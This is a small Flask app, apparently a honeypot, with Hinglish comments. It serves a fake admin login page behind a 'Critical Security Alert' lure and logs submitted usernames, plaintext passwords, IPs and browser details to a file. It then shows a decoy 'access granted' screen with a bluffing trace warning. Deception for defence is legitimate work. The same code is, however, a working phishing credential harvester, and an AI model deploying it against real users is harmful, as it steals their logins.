from flask import Flask,render_template_string, request
import datetime  # Ye alag line mein hona chahiye

app = Flask(__name__)

# --- HTML Templates ---
login_html = """
<!DOCTYPE html>
<html>
<head><title>Network Admin Login</title></head>
<body style="background:#f4f4f4; font-family: Arial; text-align: center; margin-top: 100px;">
    <div style="width: 350px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 15px #aaa;">
        <h2 style="color: #d9534f;">⚠️ Critical Security Alert</h2>
        <p>Unusual activity detected. Please verify your Admin Credentials.</p>
        <form method="POST" action="/login">
            <input type="text" name="user" placeholder="Username" style="width:90%; padding:12px; margin-bottom:15px; border:1px solid #ccc;" required><br>
            <input type="password" name="pass" placeholder="Password" style="width:90%; padding:12px; margin-bottom:15px; border:1px solid #ccc;" required><br>
            <button type="submit" style="width:100%; padding:12px; background:#28a745; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">Verify & Unlock</button>
        </form>
    </div>
</body>
</html>
"""

dashboard_html = """
<!DOCTYPE html>
<html>
<head><title>Admin Console</title></head>
<body style="background:#1a1a1a; color: #33ff33; font-family: 'Courier New', monospace; padding: 30px;">
    <h2>[SYSTEM OVERRIDE: ACCESS GRANTED]</h2>
    <hr color="#33ff33">
    <p>> Initializing network forensic scan...</p>
    <p>> Loading internal databases...</p>
    <p style="color: yellow;">> WARNING: Connection unstable. Patching encryption...</p>
    <div style="border: 1px dashed #33ff33; padding: 20px; margin-top: 20px;">
        <h3>Sensitive Files:</h3>
        <ul>
            <li><a href="#" style="color: #33ff33;">Server_Keys_2025.enc</a></li>
            <li><a href="#" style="color: #33ff33;">User_Database_Backup.sql</a></li>
            <li><a href="#" style="color: #33ff33;">Root_Access_Logs.txt</a></li>
        </ul>
    </div>
    <p style="color: red; margin-top: 40px; font-weight: bold;">[!] TRACE ACTIVE: Your Device Signature has been logged.</p>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(login_html)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent') # Hacker ka device aur browser
    lang = request.headers.get('Accept-Language') # Hacker ki language

    # Detailed Log Save Karo
    with open("hacker_attempts.txt", "a") as f:
        f.write(f"\n--- NEW INTRUDER CAPTURED ---\n")
        f.write(f"Time: {datetime.datetime.now()}\n")
        f.write(f"IP Address: {ip}\n")
        f.write(f"Credentials: {user} / {password}\n")
        f.write(f"Device Info: {user_agent}\n")
        f.write(f"Language: {lang}\n")
        f.write(f"------------------------------\n")
    
    return render_template_string(dashboard_html)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)